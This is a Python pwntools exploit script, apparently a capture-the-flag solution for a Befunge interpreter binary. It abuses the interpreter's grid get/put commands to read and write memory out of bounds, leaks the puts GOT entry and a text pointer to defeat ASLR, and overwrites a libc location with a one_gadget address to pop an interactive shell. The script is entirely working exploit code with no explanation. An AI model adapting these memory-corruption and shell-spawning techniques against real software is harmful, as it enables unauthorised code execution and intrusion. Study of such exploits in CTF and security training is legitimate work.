#!/usr/bin/env python
from pwn import *
import math

def leak(addr):
    for i in range(8):
        diff = addr - program_addr
        s.sendline(str(diff % 0x50))
        s.sendline(str(diff // 0x50))
        addr += 1

def divide(val):
    x = int(math.sqrt(val))
    s.sendline(str(x))
    s.sendline(str(x))
    s.sendline(str(val - x * x))

def overwrite(diff, val):
    for v in p64(val):
        s.sendline(str(ord(v)))
        s.sendline(str(diff % 0x50))
        divide(diff // 0x50)
        diff += 1

if __name__ == '__main__':
    s = process('./befunge')
    elf = ELF('./befunge')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    sp_addr = 0x202024
    program_addr = 0x202040
    stack_addr = 0x202820

    program = [
        '&&g,' * 0x10 + 'v',
        'v' + '<' * 0x4f,
        '>' + '&&&&*&+p' * 8 + '@'
    ]
    program += [''] * (0x7d0 // 0x50 - len(program))
    for line in program:
        s.sendlineafter('> ', line)

    leak(elf.got['puts'])
    libc_base = u64(s.recv(8)) - libc.symbols['puts']
    log.info('libc base: %#x' % libc_base)

    leak(0x202008)
    text_base = u64(s.recv(8)) - 0x202008
    log.info('text base: %#x' % text_base)

    one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    overwrite(libc_base + 0x5f0f48 - (text_base + program_addr), libc_base + one_gadgets[3])
    s.recvuntil('Program exited\n')
    s.interactive()
